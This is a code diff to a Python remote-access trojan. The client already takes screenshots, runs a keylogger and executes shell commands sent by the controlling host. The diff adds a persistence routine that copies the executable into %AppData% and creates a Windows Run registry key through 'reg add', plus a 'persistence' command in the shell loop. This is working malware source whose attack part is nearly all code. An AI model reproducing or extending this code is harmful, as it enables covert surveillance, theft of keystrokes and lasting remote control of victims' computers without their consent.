@@ -5,6 +5,8 @@ import os
 import pyautogui
 import keylogger
 import threading
+import shutil
+import sys
 
 def send(data):
     jsonData = json.dumps(data)
@@ -52,6 +54,23 @@ def screenshot():
     prtscr = pyautogui.screenshot()
     prtscr.save('screen.png')
 
+# Create a persistent file in the target's machine by copying it into %AppData% and adding a registry key
+def persist(regName, copyName):
+    filePath = os.environ['appdata'] + '\\' + copyName
+
+    # Check if the file already exists, if it doesn't, copy it to %AppData% and create a new Regestry Key
+    try:
+        if not os.path.exists(filePath):
+            shutil.copyfile(sys.executable, filePath)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {regName} /t REG_SZ /d "{filePath}"', shell=True)
+            send(f'[+] Successfuly created persistence file with Reg Key: {regName}')
+    
+        else:
+            send('[-] Error: Persistence has already been activated for this session')
+    
+    except:
+        send('[-] Error: Unable to create persistence')
+
 def shell():
     while True:
 
@@ -93,8 +112,11 @@ def shell():
         elif command[:11] == 'keylog-stop':
             keylog.deleteFile()
             t.join()
-            send(f'''[+] The keylogger session at [{socket.gethostname()}] was ended by the host. Exit with code 0x0
-            [+] Log file deleted from [{keylog.path}] on target [{socket.gethostname()}]''')
+            send(f'''[+] The keylogger session at [{socket.gethostname()}] was ended by the host. Dump Files deleted''')
+
+        elif command[:11] == 'persistence':
+            regName, copyName = command[12:].split(' ')
+            persist(regName, copyName)
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
